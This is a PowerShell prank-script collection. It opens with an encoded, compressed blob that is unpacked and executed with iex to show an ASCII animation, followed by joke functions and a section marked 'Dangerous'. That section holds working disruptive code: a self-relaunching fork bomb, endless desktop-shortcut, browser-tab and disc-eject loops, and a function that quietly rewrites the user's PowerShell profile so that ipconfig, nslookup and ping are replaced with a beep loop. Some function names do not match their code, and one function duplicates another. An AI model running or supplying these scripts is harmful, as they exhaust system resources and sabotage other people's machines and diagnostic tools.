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'

## Decompress the frames, which declare an array of strings
$binaryData = [System.Convert]::FromBase64String($data)
$ms = New-Object System.IO.MemoryStream
$ms.Write($binaryData, 0, $binaryData.Length)
$ms.Seek(0,0) | Out-Null
$cs = New-Object System.IO.Compression.GZipStream($ms, [System.IO.Compression.CompressionMode]"Decompress")
$sr = New-Object System.IO.StreamReader($cs)
$structure = $sr.ReadToEnd()
iex $structure

## Go through the frames, and re-scale them so that they have the
## proper aspect ratio in the console
for($counter = 0; $counter -lt $frames.Count; $counter++)
{
    $frame = $frames[$counter]
    $expansion = (@('$1') + (('$2','$3','$2','$3') | Get-Random -Count 4 | Sort)) -join ''
    $frame = (($frame -split "`t") -replace '(.)(.)(.)',$expansion) -join "`t"
    $frames[$counter] = $frame
}
    
## Prepare the screen
$counter = 0
$maxCounter = $frames.Count - 1
$host.UI.RawUI.BackgroundColor = "White"
$host.UI.RawUI.ForegroundColor = "Black"
try
{
    $host.UI.RawUI.WindowSize = New-Object System.Management.Automation.Host.Size 83,45
}
catch {}

try
{
    $host.UI.RawUI.BufferSize = New-Object System.Management.Automation.Host.Size 83,45
} catch {}

try
{
    $host.UI.RawUI.WindowSize = New-Object System.Management.Automation.Host.Size 83,45
} catch {}

try
{
    $host.UI.RawUI.BufferSize = New-Object System.Management.Automation.Host.Size 83,45
} catch {}

## Open the background song
$script = @'
   $player = New-Object -ComObject 'MediaPlayer.MediaPlayer'
   $player.Open("http://www.leeholmes.com/projects/ps_html5/background.mp3")
   $player
'@

## ... in a background MTA-threaded PowerShell because
## the MediaPlayer COM object doesn't like STA
$runspace = [RunspaceFactory]::CreateRunspace()
$runspace.ApartmentState = "MTA"
$bgPowerShell = [PowerShell]::Create()
$bgPowerShell.Runspace = $runspace
$runspace.Open()
$player = @($bgPowerShell.AddScript($script).Invoke())[0]

try
{
    ## Wait for it to buffer (or error out)
    
    while($true)
    {
        Start-Sleep -m 500
        if($player.HasError -or ($player.ReadyState -eq 4)) { break }
    }
    
    Start-Sleep -m 1600
    Clear-Host
    
    $host.UI.RawUI.CursorPosition = New-Object System.Management.Automation.Host.Coordinates `
        0,([Console]::WindowHeight - 1)
    Write-Host -NoNewLine 'Q or ESC to Quit'
    
    ## Loop through the frames and display them
    [Console]::TreatControlCAsInput = $true
    while($true)
    {
        if([Console]::KeyAvailable)
        {
            $key = [Console]::ReadKey()
            if(($key.Key -eq 'Escape') -or
                ($key.Key -eq 'Q') -or
                ($key.Key -eq 'C'))
            {
                break
            }
        }
        
        if((-not $player.HasError) -and ($player.PlayState -eq 0)) { break }
        $host.UI.RawUI.CursorPosition = New-Object System.Management.Automation.Host.Coordinates 0,0
        Write-Host (($frames[$counter] -split "`t") -join "`r`n")
        
        Start-Sleep -m 100
        $counter = ($counter + 1) % $maxCounter
    }
}
finally
{
    ## Clean up, display exit screen
    Clear-Host
    $frames[-1] -split "`t"
    "`n"
    "                        Happy Scripting from PowerShell..."
    "                                 and Rick ASCII!"
    "`n`n`n"
    $player.Stop()
    $bgPowerShell.Dispose()
    }
}

Function Invoke-99BottlesOfBeer
{
    [System.Reflection.Assembly]::LoadWithPartialName("System.Windows.Forms")
    $result = [System.Windows.Forms.MessageBox]::Show('Warning: This script is EXTREMELY loud and annoying. Are you sure you want to piss off your co-workers?' , "99 Bottles of Beer on the Wall!" , 4)
    
    if ($result -eq 'Yes') {
        Add-Type -AssemblyName System.speech
        $speak = New-Object System.Speech.Synthesis.SpeechSynthesizer

        foreach ($total in 99..1) {
            if ($total -ne 1) {
                $Words = "$total bottles of beer on the wall, $total bottles of beer. Take one down and pass it around, $($total - 1)  bottles of beer on the wall."
                }
            else {
                $Words = "$total bottle of beer on the wall, $total bottles of beer. Take one down and pass it around, no more bottles of beer on the wall."
                 }
            $speak.Speak($Words)
        }
    }
}

Function Invoke-Gandalf
{
    Set-AudioLevel(0.4) #For optimal surprise
    Start-Process iexplore -ArgumentList "-k https://player.vimeo.com/video/198392879?autoplay=1"
}

function Get-Trivia 
{
#.AUTHOR https://gist.github.com/VV-B0Y
    param (
        [Parameter(Mandatory)]
        [ValidateSet("easy", "medium", "hard")]
        [String]
        $Difficulty,

        [Parameter(Mandatory)]
        [Int]
        $Amount
    )

    # Lets create an array to store the questions & answers in
    $Questions = @()

    # This is a HashTable to store categories and their corresponding number codes assigned by the API
    $Topics = @{
        General_Knowledge    = 9
        Books                = 10
        Film                 = 11
        Music                = 12
        Musicals_Theatres    = 13
        Television           = 14
        VideoGames           = 15
        BoardGames           = 16
        Science_Nature       = 17
        Science_Computers    = 18
        Science_Mathematics  = 19
        Mythology            = 20
        Sports               = 21
        Geography            = 22
        History              = 23
        Politics             = 24
        Art                  = 25
        Celebrities          = 26
        Animals              = 27
        Vehicles             = 28
        Comics               = 29
        Science_Gadgets      = 30
        Japanese_Anime_Manga = 31
        Cartoon_Animations   = 32
    }

    # loop through each topic and collect specified amount of questions & answers
    foreach ($Topic in $Topics.values) {
        $TriviaSplat = @{
            Uri    = 'https://opentdb.com/api.php?amount={0}&category={1}&difficulty={2}' -f $Amount, $Topic, $Difficulty.ToLower()
            Method = 'Get'
        }
        $TriviaResponse = Invoke-RestMethod @TriviaSplat

        # Now loop through each question and format / add them to the $Questions array we created earlier
        foreach ($item in $TriviaResponse.results) {
            $Question = [PSCustomObject]@{
                Category    = $item.Category
                Difficulty  = $item.Difficulty
                Question    = $item.Question
                Answer      = $item.Correct_Answer
                WrongAnswer = $item.Incorrect_answers
            }
            $Questions += $Question
        }
    }
    $Questions
}


#### Dangerous
function Invoke-ForkBomb
{
#.AUTHOR https://raw.githubusercontent.com/Hackstur
    $result = [System.Windows.Forms.MessageBox]::Show('This is potentially EXTREMELY dangerous to run. Are you sure?' , "WARNING!" , 4)
    
    if ($result -eq 'Yes') {
    While (1) 
        { 
            $WScript = New-Object -com wscript.shell; $WScript.Exec("powershell.exe &" + $PSCommandPath); 
            #Alt1: For(){Ps|Ii}
            #Alt2: For(){ Sajb{ For(){ } } }
        }     
    }
}

function Invoke-DesktopShortcutBomb
{
#.AUTHOR https://github.com/Agunderman10
    while(1) 
    {
        #assign num to a random number each time around so we can create new shortcuts with different names. We need different names for each
        #shortcut because any shortcut with the same name as a shortcut already on the desktop will not be shown. Therefore, we assign a
        #random number to num and place it into the shortcut name so we can create new shortcuts.
        $num = Get-Random
        $AppLocation = "C:\Windows\System32\rundll32.exe"
        $WshShell = New-Object -ComObject WScript.Shell
    
        #add num in the middle of the shortcut here
        $Shortcut = $WshShell.CreateShortcut("$Home\Desktop\USB Hardware" + $num + ".lnk")
        $Shortcut.TargetPath = $AppLocation
        $Shortcut.Arguments ="shell32.dll,Control_RunDLL hotplug.dll"
        $Shortcut.IconLocation = "hotplug.dll,0"
        $Shortcut.Description ="Device Removal"
        $Shortcut.WorkingDirectory ="C:\Windows\System32"
        $Shortcut.Save()
    }
}

function Invoke-MailBoxBomb
{
#.AUTHOR https://raw.githubusercontent.com/Hackstur
    $result = [System.Windows.Forms.MessageBox]::Show('This is potentially EXTREMELY dangerous to run. Are you sure?' , "WARNING!" , 4)
    
    if ($result -eq 'Yes') 
    {
        While (1) 
        { 
            powershell 
            $Diskmaster = New-Object -ComObject IMAPI2.MsftDiscMaster2 
            $DiskRecorder = New-Object -ComObject IMAPI2.MsftDiscRecorder2 
            $DiskRecorder.InitializeDiscRecorder($DiskMaster) 
            while (1) 
            {
                $DiskRecorder.EjectMedia() 
            }
        }     
    }
}

function Invoke-ChromeBomb
{
#.AUTHOR https://raw.githubusercontent.com/Hackstur
    $result = [System.Windows.Forms.MessageBox]::Show('This is potentially EXTREMELY dangerous to run. Are you sure?' , "WARNING!" , 4)
    
    if ($result -eq 'Yes') {
    While (1) 
        { 
            $WScript = New-Object -com wscript.shell; $WScript.Exec("powershell.exe &" + $PSCommandPath); 
            #Alt1: For(){Ps|Ii}
            #Alt2: For(){ Sajb{ For(){ } } }
        }     
    }
}

function Invoke-TabBomb
{
#.AUTHOR https://github.com/Agunderman10
    while(1) 
    {
        Start-Process 'http://www.google.com/'
    }
}

function Invoke-SysadminTroll
{
#.AUTHOR https://raw.githubusercontent.com/Hackstur
    $PShellProfile = "$env:USERPROFILE\Documents\WindowsPowershell\Microsoft.Powershell_profile.ps1"

    cd $env:USERPROFILE\Documents
    New-Item WindowsPowershell -ItemType Directory -ErrorAction SilentlyContinue | Out-Null
    cd WindowsPowershell
    New-Item Microsoft.Powershell_profile.ps1 -ItemType File -ErrorAction SilentlyContinue | Out-Null

    Add-Content -Path $PShellProfile -Value "function Troll"
    Add-Content -Path $PShellProfile -Value "{"
    Add-Content -Path $PShellProfile -Value "`t`$i = 1"
    Add-Content -Path $PShellProfile -Value "`tdo {`$i; `$i++"
    Add-Content -Path $PShellProfile -Value "`t[console]::beep(784,150)"
    Add-Content -Path $PShellProfile -Value "`tStart-Sleep -m 300"
    Add-Content -Path $PShellProfile -Value "`t[console]::beep(784,150)"
    Add-Content -Path $PShellProfile -Value "`tStart-Sleep -m 300"
    Add-Content -Path $PShellProfile -Value "`t[console]::beep(932,150)"
    Add-Content -Path $PShellProfile -Value "`tStart-Sleep -m 150"
    Add-Content -Path $PShellProfile -Value "`t[console]::beep(1047,150)"
    Add-Content -Path $PShellProfile -Value "`tStart-Sleep -m 150"
    Add-Content -Path $PShellProfile -Value "`t[console]::beep(784,150)"
    Add-Content -Path $PShellProfile -Value "`tStart-Sleep -m 300"
    Add-Content -Path $PShellProfile -Value "`t[console]::beep(784,150)"
    Add-Content -Path $PShellProfile -Value "`tStart-Sleep -m 300"
    Add-Content -Path $PShellProfile -Value "`t[console]::beep(699,150)"
    Add-Content -Path $PShellProfile -Value "`tStart-Sleep -m 150"
    Add-Content -Path $PShellProfile -Value "`t[console]::beep(740,150)"
    Add-Content -Path $PShellProfile -Value "`tStart-Sleep -m 150"
    Add-Content -Path $PShellProfile -Value "`t[console]::beep(784,150)"
    Add-Content -Path $PShellProfile -Value "`tStart-Sleep -m 300"
    Add-Content -Path $PShellProfile -Value "`t[console]::beep(784,150)"
    Add-Content -Path $PShellProfile -Value "`tStart-Sleep -m 300"
    Add-Content -Path $PShellProfile -Value "`t[console]::beep(932,150)"
    Add-Content -Path $PShellProfile -Value "`tStart-Sleep -m 150"
    Add-Content -Path $PShellProfile -Value "`t[console]::beep(1047,150)"
    Add-Content -Path $PShellProfile -Value "`tStart-Sleep -m 150"
    Add-Content -Path $PShellProfile -Value "`t[console]::beep(784,150)"
    Add-Content -Path $PShellProfile -Value "`tStart-Sleep -m 300"
    Add-Content -Path $PShellProfile -Value "`t[console]::beep(784,150)"
    Add-Content -Path $PShellProfile -Value "`tStart-Sleep -m 300"
    Add-Content -Path $PShellProfile -Value "`t[console]::beep(699,150)"
    Add-Content -Path $PShellProfile -Value "`tStart-Sleep -m 150"
    Add-Content -Path $PShellProfile -Value "`t[console]::beep(740,150)"
    Add-Content -Path $PShellProfile -Value "`tStart-Sleep -m 150"
    Add-Content -Path $PShellProfile -Value "`t[console]::beep(932,150)"
    Add-Content -Path $PShellProfile -Value "`t[console]::beep(784,150)"
    Add-Content -Path $PShellProfile -Value "`t[console]::beep(587,1200)"
    Add-Content -Path $PShellProfile -Value "`t[console]::beep(587,1200)"
    Add-Content -Path $PShellProfile -Value "`tStart-Sleep -m 75"
    Add-Content -Path $PShellProfile -Value "`t[console]::beep(932,150)"
    Add-Content -Path $PShellProfile -Value "`t[console]::beep(784,150)"
    Add-Content -Path $PShellProfile -Value "`t[console]::beep(784,150)"
    Add-Content -Path $PShellProfile -Value "`t[console]::beep(554,1200)"
    Add-Content -Path $PShellProfile -Value "`tStart-Sleep -m 75"
    Add-Content -Path $PShellProfile -Value "`t[console]::beep(932,150)"
    Add-Content -Path $PShellProfile -Value "`t[console]::beep(784,150)"
    Add-Content -Path $PShellProfile -Value "`t[console]::beep(523,1200)"
    Add-Content -Path $PShellProfile -Value "`tStart-Sleep -m 150"
    Add-Content -Path $PShellProfile -Value "`t[console]::beep(466,150)"
    Add-Content -Path $PShellProfile -Value "`t[console]::beep(466,150)"
    Add-Content -Path $PShellProfile -Value "`t[console]::beep(523,150)"
    Add-Content -Path $PShellProfile -Value  "`t} until (`$i -gt 500)"
    Add-Content -Path $PShellProfile -Value "}"

    Add-Content -Path $PShellProfile -Value "`n`nSet-Alias -Name ipconfig -Value Troll"
    Add-Content -Path $PShellProfile -Value "Set-Alias -Name nslookup -Value Troll"
    Add-Content -Path $PShellProfile -Value "Set-Alias -Name ping -Value Troll"
}

<#
<function Invoke-RedAlert {

    if(-not (Get-Module MSTerminalSettings -ListAvailable)){
    Install-Module MSTerminalSettings -Scope CurrentUser -Repository PSGallery -Force
    }
    
    Import-Module MSTerminalSettings
    Set-MSTerminalProfile -Name pwsh -CommandLine "pwsh -noexit -command `$env:WT_PROFILE = 'pwsh'"
    Set-MSTerminalProfile -Name powershell -CommandLine "powershell -noexit -command `$env:WT_PROFILE = 'powershell'"
    $IsFail = !$?
        if(!$Global:__PromptPS) {
        $Runspace = [runspacefactory]::CreateRunspace()
        $Global:__PromptPS = [PowerShell]::Create()
        $Global:__PromptPS.Runspace = $Runspace
        $Runspace.Open()
        [void]$Global:__PromptPS.Addscript({
            ipmo msterminal
            $OldProfile = Get-MSTerminalProfile -Name $env:WT_PROFILE
            Set-MSTerminalProfile -name $env:WT_PROFILE -BackgroundImage 'https://media.giphy.com/media/ErE2BHnoCWsYU/giphy.gif' -backgroundImageStretchMode uniformToFill -UseAcrylic:$False
            Start-Sleep -Seconds 2.41
            $OldProfile | Set-MSTerminalProfile
        })
    }
        if($IsFail) {
        [void]$Global:__PromptPS.BeginInvoke()
    }
    "PS $($executionContext.SessionState.Path.CurrentLocation)$('>' * ($nestedPromptLevel + 1)) ";
}
#>